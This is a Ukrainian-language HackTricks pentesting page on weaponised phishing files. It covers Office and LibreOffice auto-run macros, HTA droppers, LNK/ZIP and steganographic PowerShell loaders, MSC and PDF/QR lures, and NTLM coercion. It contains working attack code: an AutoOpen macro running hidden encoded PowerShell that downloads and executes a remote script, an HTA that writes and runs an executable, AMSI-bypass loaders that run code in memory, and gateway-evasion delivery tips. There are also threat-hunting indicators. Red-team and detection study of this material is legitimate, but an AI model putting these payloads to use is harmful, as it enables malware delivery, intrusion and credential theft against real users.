# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word перевіряє дані файлу перед його відкриттям. Перевірка даних виконується шляхом визначення структури даних відповідно до стандарту OfficeOpenXML. Якщо під час визначення структури даних виникає помилка, файл не буде відкрито.

Зазвичай файли Word із макросами мають розширення `.docm`. Однак файл можна перейменувати, змінивши розширення, і він усе одно зможе виконувати макроси.\
Наприклад, файли RTF за задумом не підтримують макроси, але файл DOCM, перейменований на RTF, відкриється в Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми діють у всіх програмах пакета Microsoft Office (Excel, PowerPoint тощо).

За допомогою наведеної нижче команди можна перевірити, які розширення виконуватимуться в деяких програмах Office:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-файли, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить макроси, також можуть «виконувати» макроси.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Документи Office — завантаження зовнішнього зображення: перейдіть до Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Щоб проаналізувати отриманий документ, а не створити його, див. [аналіз макросів VBA: непотрібний код і UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Бекдор через макроси

За допомогою макросів можна запускати довільний код із документа.

#### Функції автозавантаження

Що частіше їх використовують, то ймовірніше, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Видалення метаданих вручну

Перейдіть до **Файл > Відомості > Перевірити документ > Перевірити документ** — відкриється інспектор документів. Натисніть **Перевірити**, а потім **Видалити все** поруч із пунктом **Властивості документа та особиста інформація**.

#### Розширення документа

Після завершення виберіть розкривний список **Тип файлу** та змініть формат із **`.docx`** на Word 97-2003 **`.doc`**.\
Зробіть це, оскільки **у файлі `.docx` не можна зберігати макроси**, а розширення з підтримкою макросів **`.docm`** має **стигму** (наприклад, на мініатюрі зображено великий `!`, а деякі вебпоштові шлюзи повністю блокують такі файли). Тому це **застаріле розширення `.doc` — найкращий компроміс**.

#### Генератори шкідливих макросів

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Макроси LibreOffice ODT з автоматичним запуском (Basic)

Документи LibreOffice Writer можуть містити макроси Basic і запускати їх автоматично під час відкриття файлу, прив’язавши макрос до події **Відкрити документ** (Інструменти → Налаштувати → Події → Відкрити документ → Макрос…).<sup>[[1]](#references)</sup> Простий макрос зі зворотним shell виглядає так:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Зверніть увагу на подвійні лапки (`""`) усередині рядка — LibreOffice Basic використовує їх для екранування буквальних лапок, тому payloads, що закінчуються на `...==""")`, залишають і внутрішню команду, і аргумент Shell збалансованими.

Поради щодо доставки:

- Збережіть файл як `.odt` і прив’яжіть макрос до події документа, щоб він запускався одразу після відкриття.
- Надсилаючи лист через `swaks`, використовуйте `--attach @resume.odt` (`@` обов’язковий, щоб як вкладення передавалися байти файлу, а не рядок із його назвою). Це критично під час зловживання SMTP-серверами, які приймають довільних одержувачів `RCPT TO` без перевірки.

## Файли HTA

HTA — це програма Windows, яка **поєднує HTML і мови сценаріїв (наприклад, VBScript і JScript)**. Вона створює інтерфейс користувача й запускається як застосунок із «повною довірою», без обмежень моделі безпеки браузера.

HTA запускається за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, тож `mshta` залежить від IE. Якщо його видалити, HTA не зможуть запускатися.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Фальшиві картки вкладень в HTML-листах

HTML-лист може імітувати нативну картку попереднього перегляду вкладення провайдера, не містячи справжнього вкладення. Talos спостерігала картку Gmail, відтворену з чотирьох вбудованих MIME-частин PNG, закодованих у Base64. Увесь візуальний елемент було обгорнуто в один anchor, а значення одержувача в `?m=<target-id>` давало змогу відстежувати кожного одержувача окремо. Посилання починалося з `//`, а не з `http://` чи `https://`; браузери розпізнають цю форму без зазначення протоколу, але засоби пошуку URL, що розпізнають лише повністю кваліфіковані URL, можуть його пропустити.<sup>[[11]](#references)</sup>

Під час аналізу перевіряйте сирий MIME, а не покладайтеся на відображений список вкладень. Відтворіть, як вбудовані частини зображення утворюють візуальну картку, знайдіть anchor, що її обгортає, і нормалізуйте значення `href` без зазначення протоколу перед пошуком URL.<sup>[[11]](#references)</sup>

Щоб перевірити підміну відправника в конверті/заголовку та вирівнювання DMARC, див. [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Примусова автентифікація NTLM

Є кілька способів **віддалено примусити автентифікацію NTLM**. Наприклад, можна додати **невидимі зображення** до листів або HTML-сторінок, які відкриє користувач (навіть через HTTP MitM?). Або надіслати жертві **адресу файлів**, які **спричинять** **автентифікацію** вже під час **відкриття папки**.

**Перевірте ці та інші ідеї на таких сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише викрасти хеш або облікові дані автентифікації, а й **виконати атаки NTLM relay**:

- [**Атаки NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Створення локальних команд через LNK і `ftp.exe`

Ярлик може запускати `ftp.exe -s:icon.ico`, де текстовий файл команд замасковано розширенням зображення.<sup>[[12]](#references)</sup> Параметр `-s:` читає локальні FTP-команди; у Windows 8 і новіших версіях цей файл має бути закодований у UTF-8.<sup>[[13]](#references)</sup> Рядок, що починається з `!`, запускає локальну команду через `cmd /c`, не надсилаючи її на FTP-сервер. Для цього локального виконання FTP-з’єднання не потрібне.<sup>[[14]](#references)</sup> У описаному ланцюжку FTP-скрипт переходив до другого файлу команд. Важливий повний рядок із `!`: `!more res.ico` лише відображає файл, тоді як передавання через канал до `cmd` виконує його вміст.<sup>[[12]](#references)[[14]](#references)</sup>

У тому самому ланцюжку використовувалося періодичне завдання, яке повторно читало доступний для запису файл команд, замість встановлення нового виконуваного файла для кожного оновлення. Дією завдання була команда `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; у файлі містилася команда, що під час запуску отримувала інструкції. У спорідненому варіанті перед запуском за розкладом завантажувався замінний файл команд. На момент запуску завдання файл має існувати й бути доступним для читання; `conhost` не надає завданню вищих привілеїв, ніж передбачено його токеном користувача.<sup>[[12]](#references)</sup> Докладніше про механіку завдань див. у розділі [виконання запланованих завдань](../../windows-hardening/lateral-movement/atexec.md).

## Ярлик VHDX із прихованим MSI та документом-приманкою

Підключений VHDX може показувати видимий LNK, приховуючи MSI та таблицю-приманку в тому самому томі. У описаному ланцюжку LNK використовував `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Роздільник `&` відкриває документ-приманку, навіть якщо команда інсталятора завершується помилкою; відкриття документа не свідчить про успішне встановлення. Це варіант доставки, пов’язаний із [виконанням custom action MSI](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), а не самостійне підвищення привілеїв через MSI.<sup>[[12]](#references)</sup>

У цьому MSI `CustomAction.Type` **194** поєднує EXE, збережений у таблиці `Binary` (**2**), із прапорцями ігнорування коду повернення (**64**) та асинхронного виконання (**128**). Комбінація **64 + 128** означає, що Windows Installer не чекає завершення EXE; сам прапорець 128 означав би очікування наприкінці послідовності.<sup>[[15]](#references)[[16]](#references)</sup> Перш ніж пов’язувати виконання із вбудованим EXE, звірте `Source` дії з таблицею `Binary` і перевірте її розташування в `InstallExecuteSequence`.<sup>[[12]](#references)[[15]](#references)</sup> [UNC-шлях WebDAV може доставити віддалений MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), але це інший спосіб початкового доступу.

## Завантажувачі LNK + корисні навантаження в ZIP (безфайловий ланцюжок)

Ефективні кампанії доставляють ZIP-архів із двома звичайними документами-приманками (PDF/DOCX) і шкідливим .lnk. Суть у тому, що фактичний завантажувач PowerShell зберігається в сирих байтах ZIP після унікального маркера, а .lnk вирізає його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типовий процес, реалізований однорядковою командою PowerShell у .lnk:

1) Знайти оригінальний ZIP у типових шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і в батьківській папці поточного робочого каталогу.
2) Прочитати байти ZIP і знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера — це вбудоване корисне навантаження PowerShell.
3) Скопіювати ZIP у %ProgramData%, розпакувати там і відкрити документ-приманку .docx, щоб усе виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад каркаса PowerShell для вирізання та запуску вбудованого етапу:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Нотатки
- Доставка часто зловживає субдоменами надійних PaaS-сервісів (наприклад, *.herokuapp.com) і може обмежувати видачу payload (наприклад, видавати нешкідливі ZIP-файли залежно від IP/UA).
- Наступний етап часто розшифровує shellcode у форматі base64/XOR і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати сліди на диску.

Persistence, що використовується в тому самому ланцюжку
- Перехоплення COM TypeLib у елементі керування Microsoft Web Browser, щоб IE/Explorer або будь-який застосунок, який його вбудовує, автоматично повторно запускали payload.<sup>[[2]](#references)[[4]](#references)</sup> Докладніше та готові до використання команди дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук загроз/IOC
- ZIP-файли, що містять ASCII-рядок-маркер (наприклад, xFIQCV), доданий до даних архіву.
- Файл .lnk, який перебирає батьківські папки/папки користувачів, щоб знайти ZIP-файл і відкрити документ-приманку.
- Втручання в AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Тривалі робочі ланцюжки листування, що завершуються посиланнями на надійні домени PaaS.

## Спочатку відкриття приманки через LNK → persistence через заплановане завдання → довірене side-loading CPL

Ще один типовий шаблон — **файл `.lnk`, що видає себе за документ** і одразу відкриває нешкідливий файл-приманку, поки у фоновому режимі готує справжній ланцюжок.<sup>[[3]](#references)</sup>

Спостережуваний сценарій:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний проксі для запуску обфускованого завантажувача PowerShell.
2. PowerShell розбиває очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), щоб прості засоби виявлення, які шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, не розпізнали команду.
3. Стейджер спочатку завантажує **документ-приманку**, відкриває його для жертви, а потім у фоновому режимі відновлює шкідливі файли.
4. Payload може зберігатися з **беззмістовними розширеннями**, а потім перейменовуватися шляхом видалення символів-заповнювачів, що відкладає появу очевидних артефактів `.exe` / `.cpl`.
5. Persistence забезпечується **запланованим завданням, що запускається щохвилини** й запускає довірений бінарний файл із шляху, доступного для запису користувачем.

Основні ознаки для пошуку загроз у цьому шаблоні:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Корисна схема розміщення файлів, яку варто розпізнавати:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому другий етап непомітний

У кейсі Rapid7 заплановане завдання неодноразово запускало **`Fondue.exe`** з `C:\Users\Public\`. Оскільки поруч із ним було розміщено **`APPWIZ.cpl`**, який експортував **`RunFODW`**, довірений двійковий файл Microsoft завантажував CPL зловмисника замість легітимної системної копії.

Потім CPL:
- Зчитує blob **AES-256-CBC** із `C:\Windows\Tasks\editor.dat`
- Розшифровує його за допомогою **Windows CNG / `bcrypt.dll`**
- Виділяє виконувану пам’ять і копіює туди розшифрований shellcode
- Виконує його непрямо, передаючи вказівник на shellcode як callback для **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимною WinAPI-функцією, що приймає callback**, щоб передати керування.

Розшифрованим payload у цій кампанії був shellcode **Donut**, який потім повністю завантажував PE-файл у пам’ять і патчив **AMSI/WLDP/ETW** у поточному процесі перед передаванням керування. Докладніші нотатки про side-loading і постобробку в пам’яті див. тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні орієнтири для пошуку:
- `.lnk`, що запускає `powershell.exe` або `conhost.exe`, після чого відкривається видимий документ-приманка.
- Короткочасні завантаження у **`C:\Users\Public\`**, за якими одразу йде перейменування файлів із безглуздими розширеннями.
- Заплановані завдання з непримітними назвами на кшталт `GoogleErrorReport`, які запускаються з **каталогів, доступних для запису користувачам**.
- Довірені двійкові файли, що завантажують файли **`.cpl` / `.dll`** з того самого нестандартного системного каталогу.
- Текстові blob-файли Base64, записані в **`C:\Windows\Tasks\`**, а потім зчитані модулем, завантаженим через side-loading.

## Payload-файли в зображеннях, відокремлені маркерами стеганографії (PowerShell stager)

Сучасні ланцюжки завантажувачів доставляють обфускований JavaScript/VBS, який декодує та запускає PowerShell stager у форматі Base64. Цей stager завантажує зображення (часто GIF), що містить приховану як звичайний текст .NET DLL у Base64 між унікальними початковими й кінцевими маркерами. Скрипт шукає ці роздільники (приклади, виявлені в реальних атаках: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, декодує Base64 у байти, завантажує збірку в пам’ять і викликає відомий метод входу, передаючи URL C2.<sup>[[5]](#references)</sup>

Робочий процес
- Етап 1: JS/VBS-дропер в архіві → декодує вбудований Base64 → запускає PowerShell stager із параметрами -nop -w hidden -ep bypass.
- Етап 2: PowerShell stager → завантажує зображення, витягує Base64 між маркерами, завантажує .NET DLL у пам’ять і викликає її метод (наприклад, VAI), передаючи URL C2 та параметри.
- Етап 3: Завантажувач отримує фінальний payload і зазвичай впроваджує його за допомогою process hollowing у довірений двійковий файл (зазвичай MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Докладніше про process hollowing і проксі-виконання через довірені утиліти див. тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для витягування DLL із зображення та виклику методу .NET у пам’яті:

<details>
<summary>PowerShell-екстрактор стеганографічного payload і завантажувач</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Нотатки
- Це ATT&CK T1027.003 (стеганографія/приховування маркерів).<sup>[[6]](#references)</sup> Маркери відрізняються між кампаніями.
- Обхід AMSI/ETW і деобфускацію рядків зазвичай виконують перед завантаженням збірки.
- Пошук загроз: скануйте завантажені зображення на наявність відомих роздільників; виявляйте PowerShell, що звертається до зображень і відразу декодує Base64-блоки.

Див. також інструменти стеганографії та техніки вилучення даних:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → поетапне розгортання PowerShell через Base64

Поширеним першим етапом є невеликий, сильно обфускований файл `.js` або `.vbs`, доставлений в архіві. Його єдине призначення — декодувати вбудований рядок Base64 і запустити PowerShell з параметрами `-nop -w hidden -ep bypass`, щоб завантажити наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Схематична логіка (абстрактно):
- Зчитати вміст власного файла
- Знайти блок Base64 між рядками-сміттям
- Декодувати до ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, викликавши `powershell.exe`

Ознаки для пошуку
- Вкладені в архів файли JS/VBS, що запускають `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` із тимчасових каталогів користувача.

## Документи MSC як контейнери виконання (GrimResource)

Файли Microsoft Management Console (`.msc`) — це визначення консолей у форматі XML, які зазвичай відкриваються через `mmc.exe`. **GrimResource** використовує посилання `StringTable` на ресурс `apds.dll`, що містить застарілий XSS-примітив, тому під час відкриття спеціально створеної консолі користувачем JavaScript запускається всередині `mmc.exe`. У виявлених зразках поєднували обфускацію на основі `transformNode` з **DotNetToJScript`, щоб створити екземпляр .NET-пейлоада без звичного шляху через макроси Office.<sup>[[9]](#references)</sup>

Для первинного статичного аналізу розглядайте недовірений MSC як текст і **не** відкривайте його подвійним клацанням:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Високосигнальні runtime-ознаки — це завантаження `mmc.exe` компонентів CLR або скриптів, створення мережевих з’єднань чи запуск `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` або неочікуваного виконуваного файла. Формат легітимний, тому виявлення має корелювати **джерело + підозрілий вміст XML/скрипту + поведінку `mmc.exe`**, а не блокувати всі MSC-файли.<sup>[[9]](#references)</sup>

## PDF/QR-перенаправлення та керування доставкою payload

Щоб PDF був корисним, йому не потрібен експлойт. У нещодавніх кампаніях у документ, що виглядає нешкідливим, додають **QR-код або звичайне посилання**, переводять браузерну сесію за межі контролю пошти й персоналізують цільову адресу за адресою одержувача. Microsoft задокументувала PDF-файли 2025 року з QR-URL, унікальними для кожного одержувача, які вели до інфраструктури викрадення облікових даних RaccoonO365; у паралельному ланцюжку за допомогою фільтрації за IP-адресою та середовищем вибраним відвідувачам надавався шлях до JavaScript/MSI, а сканерам або клієнтам, доступ до яких не дозволено, — нешкідливий PDF.<sup>[[10]](#references)</sup>

Під час первинного аналізу перевіряйте як дії PDF, так і відрендерені QR-коди. QR-код може бути намальований векторно, а не збережений як зображення, яке можна видобути, тому растеризуйте кожну сторінку й видобувайте вбудовані зображення:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Перевіряйте декодовані адреси призначення та перенаправлення з ізольованої системи аналізу без автентифікації. Корисні ознаки для пошуку: PDF-файли лише з QR-кодом і майже порожнім текстом листа, адреса електронної пошти одержувача в параметрі запиту, кілька перенаправлень через надійні хостингові платформи та різний вміст залежно від IP-адреси, геолокації, cookie, referrer або user agent. Порівнюйте запити з контрольованими профілями, оскільки один запит із sandbox може отримати лише приманку.<sup>[[10]](#references)</sup>

## Файли Windows для викрадення NTLM-хешів

Перегляньте сторінку про **місця для викрадення облікових даних NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – макрос LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – кампанія ZipLine: складна фішингова атака, спрямована на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: відстеження тактик Dropping Elephant через ланцюжок завантажувачів на китайську тематику](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – нова техніка COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – завантажувач PhantomVAI поширює різні викрадачі інформації](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – стеганографія (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – виконання через проксі довірених утиліт розробника: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console для початкового доступу та ухилення від виявлення](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – зловмисники використовують податковий сезон для проведення фішингових кампаній на податкову тематику](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – ланцюжок доставки UAT-11587 і бекдор Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER розширює свій арсенал за допомогою PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - команда ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - параметри обробки повернення Custom Action](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
